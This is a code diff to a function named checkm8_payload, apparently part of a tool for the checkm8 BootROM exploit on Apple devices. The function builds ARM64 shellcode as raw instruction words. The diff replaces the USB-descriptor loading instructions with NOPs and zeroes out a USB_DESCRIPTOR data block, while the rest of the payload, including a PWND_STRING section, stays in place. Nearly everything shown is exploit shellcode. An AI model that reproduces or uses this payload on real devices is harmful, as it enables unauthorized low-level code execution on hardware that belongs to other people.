@@ -57,11 +57,11 @@ static int checkm8_payload(io_client_t client)
     *(uint32_t*)(shc+i) = 0xa9bf7bfd; i+=4; // stp   x29, x30, [sp, #-0x10]!
     *(uint32_t*)(shc+i) = 0x910003fd; i+=4; // mov   x29, sp
     
-    *(uint32_t*)(shc+i) = 0x58000960; i+=4; // ldr   x0, =gUSBDescriptors
-    *(uint32_t*)(shc+i) = 0xa9400400; i+=4; // ldp   x0, x1, [x0]
-    *(uint32_t*)(shc+i) = 0x10000782; i+=4; // adr   x2, USB_DESCRIPTOR
-    *(uint32_t*)(shc+i) = 0xa9401043; i+=4; // ldp   x3, x4, [x2]
-    *(uint32_t*)(shc+i) = 0xa9411043; i+=4; // ldp   x3, x4, [x2, #0x10]
+    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // ldr   x0, =gUSBDescriptors
+    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // ldp   x0, x1, [x0]
+    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // adr   x2, USB_DESCRIPTOR
+    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // ldp   x3, x4, [x2]
+    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // ldp   x3, x4, [x2, #0x10]
     *(uint32_t*)(shc+i) = 0x58000900; i+=4; // ldr   x0, =gUSBSerialNumber
     
     // _find_zero_loop:
@@ -134,13 +134,13 @@ static int checkm8_payload(io_client_t client)
     *(uint32_t*)(shc+i) = 0xd65f03c0; i+=4; // ret
     
     // USB_DESCRIPTOR:
-    *(uint32_t*)(shc+i) = 0x00190209; i+=4;
-    *(uint32_t*)(shc+i) = 0x80050101; i+=4;
-    *(uint32_t*)(shc+i) = 0x000409fa; i+=4;
-    *(uint32_t*)(shc+i) = 0x01fe0000; i+=4;
-    *(uint32_t*)(shc+i) = 0x21070000; i+=4;
-    *(uint32_t*)(shc+i) = 0x00000a01; i+=4;
-    *(uint32_t*)(shc+i) = 0x00000008; i+=4;
+    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
+    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
+    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
+    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
+    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
+    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
+    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
     *(uint32_t*)(shc+i) = 0x00000000; i+=4;
     
     // PWND_STRING:
